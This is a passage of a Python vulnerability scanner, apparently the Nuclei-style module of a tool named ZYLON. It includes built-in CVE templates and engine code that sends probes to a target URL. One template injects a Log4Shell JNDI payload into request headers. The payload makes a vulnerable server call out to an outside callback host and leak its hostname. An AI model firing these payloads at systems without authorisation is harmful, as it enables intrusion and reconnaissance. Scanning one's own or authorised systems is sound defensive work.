            'tags': ['log4j', 'log4shell', 'rce', 'cve-2021', 'java'],
            'cve': 'CVE-2021-44228',
        },
        'requests': [{
            'method': 'GET',
            'path': ['/'],
            'headers': {
                'X-Api-Version': '${jndi:ldap://zylon-callback.test/${hostName}}',
                'User-Agent': '${jndi:ldap://zylon-callback.test/${hostName}}',
                'Referer': '${jndi:ldap://zylon-callback.test/${hostName}}',
                'X-Forwarded-For': '${jndi:ldap://zylon-callback.test/${hostName}}',
            },
            'matchers': {
                'status': [200, 400, 500],
            },
            'note': 'Log4Shell detection requires OOB callback server. This template checks for indicators only.',
        }],
    },
    {
        'id': 'cve-2023-22515',
        'info': {
            'name': 'Atlassian Confluence Privilege Escalation (CVE-2023-22515)',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Atlassian Confluence Broken Access Control',
            'category': 'cve',
            'tags': ['confluence', 'atlassian', 'privilege-escalation', 'cve-2023'],
            'cve': 'CVE-2023-22515',
        },
        'requests': [{
            'method': 'GET',
            'path': ['/setup/setupadministrator.action', '/setup/finishsetup.action'],
            'matchers': {
                'status': [200],
                'word': ['Setup Administrator', 'Confluence Setup', 'Administrator Setup'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'cve-2018-1000001',
        'info': {
            'name': 'glibc Buffer Overflow (CVE-2018-1000001)',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Detects glibc getcwd buffer overflow via long path',
            'category': 'cve',
            'tags': ['glibc', 'buffer-overflow', 'cve-2018'],
            'cve': 'CVE-2018-1000001',
        },
        'requests': [{
            'method': 'GET',
            'path': ['/' + 'A' * 4096],
            'matchers': {
                'status': [500, 414],
            },
        }],
    },
    {
        'id': 'cve-2019-0211',
        'info': {
            'name': 'Apache Privilege Escalation (CVE-2019-0211)',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Apache HTTP Server privilege escalation via mod_worker',
            'category': 'cve',
            'tags': ['apache', 'privilege-escalation', 'cve-2019'],
            'cve': 'CVE-2019-0211',
        },
        'requests': [{
            'method': 'GET',
            'path': ['/server-status'],
            'matchers': {
                'status': [200],
                'word': ['Apache Server Status', 'Server Version', 'MPM'],
                'word_condition': 'or',
            },
        }],
    },
]


# ============================================================================
# NUCLEI-STYLE ENGINE
# ============================================================================

class NucleiStyleEngine:
    """
    Nuclei-Style Template Engine - Pure Python vulnerability scanning
    Fused from: projectdiscovery/nuclei (No Go binary dependency)
    """

    def __init__(self, session=None, timeout=10, retries=2, threads=10,
                 verbose=True, proxy=None):
        self.session = session or requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.timeout = timeout
        self.retries = retries
        self.threads = threads
        self.verbose = verbose
        self.templates = []
        self.results = []
        self._stop_event = threading.Event()

    def _log(self, msg, level="info"):
        """Print colored log message"""
        colors = {
            "info": C, "success": G, "warning": Y,
            "error": R, "critical": R, "template": M
        }
        color = colors.get(level, W)
        prefix = {
            "info": "*", "success": "+", "warning": "!",
            "error": "-", "critical": "!!!", "template": "T"
        }.get(level, "*")
        if self.verbose:
            print(f"  {color}[{prefix}]{RS} {msg}")

    # ========================================================================
    # load_templates
    # ========================================================================

    def load_templates(self, template_dir):
        """Load YAML templates from a directory"""
        loaded = 0
        if not os.path.isdir(template_dir):
            self._log(f"Template directory not found: {template_dir}", "warning")
            return loaded

        for fname in os.listdir(template_dir):
            if not fname.endswith(('.yaml', '.yml')):
                continue
            fpath = os.path.join(template_dir, fname)
            try:
                with open(fpath, 'r') as f:
                    template = yaml.safe_load(f)
                if template and 'id' in template and 'info' in template:
                    self.templates.append(template)
                    loaded += 1
            except Exception as e:
                self._log(f"Error loading template {fname}: {str(e)[:60]}", "error")

        self._log(f"Loaded {loaded} templates from {template_dir}", "info")
        return loaded

    # ========================================================================
    # load_builtin_templates
    # ========================================================================

    def load_builtin_templates(self, category=None, severity=None):
        """Load built-in template library"""
        count = 0
        for template in BUILTIN_TEMPLATES:
            # Filter by category
            if category and template.get('info', {}).get('category') != category:
                continue
            # Filter by severity
            if severity and template.get('info', {}).get('severity') != severity:
                continue
            self.templates.append(template)
            count += 1

        self._log(f"Loaded {count} built-in templates (category={category}, severity={severity})", "info")
        return count

    # ========================================================================
    # execute_template
    # ========================================================================

    def execute_template(self, target, template):
        """
        Execute a single template against a target.
        Returns dict with result.
        """
        template_id = template.get('id', 'unknown')
        info = template.get('info', {})
        template_name = info.get('name', 'Unknown')
        severity = info.get('severity', 'info')
        category = info.get('category', 'unknown')

        result = {
            'template_id': template_id,
            'template_name': template_name,
            'severity': severity,
            'category': category,
            'matched': False,
            'findings': [],
            'details': {},
            'timestamp': datetime.now().isoformat(),
        }

        # Normalize target URL
        if not target.startswith(('http://', 'https://')):
            target = f'https://{target}'

        self._log(f"Running template: {template_name} [{severity}]", "template")

        for req in template.get('requests', []):
            method = req.get('method', 'GET').upper()
            paths = req.get('path', ['/'])
            if isinstance(paths, str):
                paths = [paths]
            headers = req.get('headers', {})
            data = req.get('data', None)
            matchers = req.get('matchers', {})

            for path in paths:
                # Handle full URLs vs relative paths
                if path.startswith('http'):
                    url = path
                else:
                    url = urljoin(target + '/', path.lstrip('/'))

                try:
                    resp = self.session.request(
                        method=method, url=url, headers=headers,
                        data=data if isinstance(data, str) else (json.dumps(data) if isinstance(data, dict) else None),
                        timeout=self.timeout, verify=False,
                        allow_redirects=True
                    )

                    matched, match_details = self.match_response(resp, matchers, target)

                    if matched:
                        result['matched'] = True
                        result['findings'].append({
                            'url': url,
                            'method': method,
                            'status_code': resp.status_code,
                            'match_details': match_details,
                            'response_length': len(resp.text),
                        })
                        self._log(f"  {G}[MATCH]{RS} {url} - {match_details}", "success")

                except requests.exceptions.RequestException as e:
                    # Some templates expect failures
                    if matchers.get('status') and 0 in matchers.get('status', []):
                        pass
                    continue

        severity_color = SEVERITY_COLORS.get(severity, W)
        if result['matched']:
            print(f"  {severity_color}[{severity.upper()}]{RS} {template_name} - {len(result['findings'])} match(es)")

        return result

    # ========================================================================
    # match_response
    # ========================================================================

    def match_response(self, response, matchers, target=None):
        """
        Check if response matches the defined matchers.
        Supports: status, word, regex, binary, dsl
        Returns (matched: bool, details: str)
        """
        if not matchers:
            return False, "No matchers defined"

        match_results = []
        details = []

        # Status code matcher
        if 'status' in matchers:
            expected_statuses = matchers['status']
            if response.status_code in expected_statuses:
                match_results.append(True)
                details.append(f"Status: {response.status_code}")
            else:
                match_results.append(False)

        # Word matcher
        if 'word' in matchers:
            words = matchers['word']
            condition = matchers.get('word_condition', 'and')
            negative_words = matchers.get('negative_words', [])

            # Check positive words
            if condition == 'and':
                word_match = all(w.lower() in response.text.lower() for w in words)
            else:  # or
                word_match = any(w.lower() in response.text.lower() for w in words)

            # Check negative words
            negative_match = False
            if negative_words:
                negative_match = any(nw.lower() in response.text.lower() for nw in negative_words)

            if word_match and not negative_match:
                matched_words = [w for w in words if w.lower() in response.text.lower()]
                match_results.append(True)
                details.append(f"Words matched: {', '.join(matched_words[:5])}")
            else:
                if negative_match:
                    match_results.append(False)
                else:
                    match_results.append(word_match)

        # Regex matcher
        if 'regex' in matchers:
            regex_patterns = matchers['regex']
            regex_match = False
            for pattern in regex_patterns:
                try:
                    # Check headers
                    headers_text = '\n'.join(f'{k}: {v}' for k, v in response.headers.items())
                    if re.search(pattern, response.text, re.IGNORECASE) or re.search(pattern, headers_text, re.IGNORECASE):
                        regex_match = True
                        match_results.append(True)
                        details.append(f"Regex matched: {pattern[:50]}")
                        break
                except re.error:
                    continue
            if not regex_match:
                match_results.append(False)

        # DSL matcher (simplified)
        if 'dsl' in matchers:
            dsl_expressions = matchers['dsl']
            for expr in dsl_expressions:
                try:
                    # Simple DSL evaluation
                    result = self._eval_dsl(expr, response)
                    if result:
                        match_results.append(True)
                        details.append(f"DSL matched: {expr[:60]}")
                    else:
                        match_results.append(False)
                except Exception:
                    match_results.append(False)

        # Binary matcher
        if 'binary' in matchers:
            binary_patterns = matchers['binary']
            for bp in binary_patterns:
                try:
                    if bp.encode() in response.content:
                        match_results.append(True)
                        details.append(f"Binary matched: {bp[:30]}")
                    else:
                        match_results.append(False)
                except Exception:
                    match_results.append(False)

        # All matchers must pass (AND logic)
        if not match_results:
            return False, "No match conditions evaluated"

        all_matched = all(match_results)
        return all_matched, '; '.join(details) if all_matched else "Not all conditions matched"

    def _eval_dsl(self, expr, response):
        """Simple DSL evaluation for matchers"""
        # Replace DSL variables with actual values
        expr = expr.replace('response_headers', 'headers_dict')
        expr = expr.replace('response_body', 'body_str')
        expr = expr.replace('status_code', str(response.status_code))

        # Build context
        headers_dict = dict(response.headers)
        body_str = response.text[:10000]

        try:
            # Safe eval with limited context
            result = eval(expr, {"__builtins__": {}}, {
                'headers_dict': headers_dict,
                'body_str': body_str,
                'len': len,
                'str': str,
                'int': int,
                'bool': bool,
                'True': True,
                'False': False,
                'None': None,
            })
            return bool(result)
        except Exception:
            return False

    # ========================================================================
    # batch_execute
    # ========================================================================

    def batch_execute(self, target, category=None, severity=None):
        """
        Execute multiple templates against a target with concurrency.
        Filters by category and/or severity.
        """
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'templates_run': 0,
                'templates_matched': 0,
                'by_severity': {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0},
                'by_category': {},
            },
            'scan_type': 'nuclei_template_scan',
        }

        # Load templates if not already loaded
        if not self.templates:
            self.load_builtin_templates(category=category, severity=severity)

        # Filter templates
        filtered = []
        for t in self.templates:
            info = t.get('info', {})
            if category and info.get('category') != category:
                continue
            if severity and info.get('severity') != severity:
                continue
            filtered.append(t)

        self._log(f"Running {len(filtered)} templates against {target}", "info")
        results['details']['templates_run'] = len(filtered)

        # Execute with thread pool
        matched = []
        lock = threading.Lock()

        def _run_template(template):
            if self._stop_event.is_set():
                return None
            try:
                result = self.execute_template(target, template)
                return result
            except Exception as e:
                self._log(f"Template error: {str(e)[:50]}", "error")
                return None

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(_run_template, t): t for t in filtered}
            for future in as_completed(futures):
                result = future.result()
                if result and result.get('matched'):
                    with lock:
                        matched.append(result)

        # Aggregate results
        for result in matched:
            results['findings'].append(result)
            sev = result.get('severity', 'info')
            cat = result.get('category', 'unknown')
            results['details']['by_severity'][sev] = results['details']['by_severity'].get(sev, 0) + 1
            results['details']['by_category'][cat] = results['details']['by_category'].get(cat, 0) + 1

        results['details']['templates_matched'] = len(matched)
        results['vulnerable'] = len(matched) > 0

        if results['vulnerable']:
            sev_summary = ', '.join(f"{k}: {v}" for k, v in results['details']['by_severity'].items() if v > 0)
            self._log(f"{G}VULNERABILITIES FOUND! {sev_summary}{RS}", "success")
        else:
            self._log("No vulnerabilities found with current templates", "warning")

        return results


# ============================================================================
# MODULE-LEVEL run() FUNCTION (Required by ZYLON)
# ============================================================================

def run(target, scan_type='all', **kwargs):
    """
    Main entry point for ZYLON integration.

    Args:
        target: Target URL
        scan_type: One of 'all', 'cve', 'exposed_panels', 'default_creds',
                   'info_disclosure', 'misconfiguration', 'full'
        **kwargs: Additional arguments (category, severity, template_dir, threads)

    Returns:
        dict: Results with 'vulnerable', 'findings', 'details', 'scan_type'
    """
    engine = NucleiStyleEngine(
        timeout=kwargs.get('timeout', 10),
        retries=kwargs.get('retries', 2),
        threads=kwargs.get('threads', 10),
        verbose=kwargs.get('verbose', True),
        proxy=kwargs.get('proxy', None),
    )

    # Map scan types to categories
    category_map = {
        'all': None,
        'cve': 'cve',
        'exposed_panels': 'exposed_panel',
        'default_creds': 'default_creds',
        'info_disclosure': 'info_disclosure',
        'misconfiguration': 'misconfiguration',
        'full': None,
    }

    severity_map = {
        'critical': 'critical',
        'high': 'high',
        'medium': 'medium',
        'low': 'low',
        'info': 'info',
    }

    category = category_map.get(scan_type, None)
    severity = kwargs.get('severity', None)

    # Load custom templates if provided
    template_dir = kwargs.get('template_dir', None)
    if template_dir:
        engine.load_templates(template_dir)

    # Load built-in templates
    engine.load_builtin_templates(category=category, severity=severity)

    # For 'full' scan, load all templates
    if scan_type == 'full':
        if not engine.templates:
            engine.load_builtin_templates()

    # Execute batch
    result = engine.batch_execute(target, category=category, severity=severity)
    result['scan_type'] = f'nuclei_{scan_type}'

    return result


# ============================================================================
# CONSOLE INTERFACE (Standalone mode)
# ============================================================================

def run_nuclei_scan(console=None):
    """Interactive Nuclei-style scan for ZYLON menu"""
    if console is None:
        from rich.console import Console
        console = Console()

    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt

    console.print(Panel(
        "[bold cyan]NUCLEI-STYLE TEMPLATE ENGINE[/bold cyan]\n"
        "[yellow]Fused from: projectdiscovery/nuclei | Pure Python[/yellow]\n"
        "[green]Templates: 50+ Built-in (CVE, Panels, Creds, Info, Misconfig)[/green]\n"
        "[magenta]Matchers: Status, Word, Regex, Binary, DSL[/magenta]",
        border_style="bright_cyan"
    ))

    target = Prompt.ask("[cyan]Enter target URL[/cyan]")
    if not target.strip():
        console.print("[red][-] No URL provided![/red]")
        return

    scan_type = Prompt.ask(
        "[cyan]Scan type[/cyan]",
        choices=["all", "cve", "exposed_panels", "default_creds", "info_disclosure", "misconfiguration", "full"],
        default="all"
    )

    engine = NucleiStyleEngine(timeout=10, threads=10, verbose=True)

    with console.status(f"[bold green]Running {scan_type} templates...", spinner="dots"):
        result = run(target.strip(), scan_type=scan_type)

    if result.get('vulnerable'):
        console.print(f"\n[bold green][+] VULNERABILITIES FOUND! {result['details']['templates_matched']} template(s) matched[/bold green]")

        # Display by severity
        for finding in result.get('findings', []):
            severity = finding.get('severity', 'info')
            severity_color = {
                'critical': 'bold red',
                'high': 'red',
                'medium': 'yellow',
                'low': 'cyan',
                'info': 'dim',
            }.get(severity, 'white')

            console.print(f"\n  [{severity_color}][{severity.upper()}][/{severity_color}] {finding.get('template_name', 'Unknown')}")
            for match in finding.get('findings', []):
                console.print(f"    [dim]URL:[/dim] {match.get('url', 'N/A')}")
                console.print(f"    [dim]Method:[/dim] {match.get('method', 'GET')}")
                console.print(f"    [dim]Status:[/dim] {match.get('status_code', 'N/A')}")
                console.print(f"    [dim]Details:[/dim] {match.get('match_details', 'N/A')}")
    else:
        console.print("\n[yellow][-] No vulnerabilities found with current templates.[/yellow]")

    # Summary table
    summary = result.get('details', {})
    if summary.get('by_severity'):
        table = Table(title="Scan Summary", box=box.ROUNDED, border_style="bright_magenta")
        table.add_column("Severity", style="cyan")
        table.add_column("Count", style="green")
        for sev, count in summary['by_severity'].items():
            if count > 0:
                table.add_row(sev.upper(), str(count))
        console.print(table)


if __name__ == "__main__":
    run_nuclei_scan()
